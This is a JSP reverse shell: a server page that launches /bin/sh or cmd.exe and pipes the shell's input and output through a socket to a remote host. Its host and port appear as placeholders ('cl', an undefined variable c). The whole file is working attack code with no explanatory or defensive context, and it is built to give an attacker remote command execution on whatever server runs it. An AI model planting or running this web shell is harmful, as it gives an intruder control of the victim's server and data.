<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream aa;
    OutputStream e2;

    StreamConnector( InputStream aa, OutputStream e2 )
    {
      this.aa = aa;
      this.e2 = e2;
    }

    public void run()
    {
      BufferedReader xr  = null;
      BufferedWriter os_ = null;
      try
      {
        xr  = new BufferedReader( new InputStreamReader( this.aa ) );
        os_ = new BufferedWriter( new OutputStreamWriter( this.e2 ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = xr.read( buffer, 0, buffer.length ) ) > 0 )
        {
          os_.write( buffer, 0, length );
          os_.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( xr != null )
          xr.close();
        if( os_ != null )
          os_.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "cl", c );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
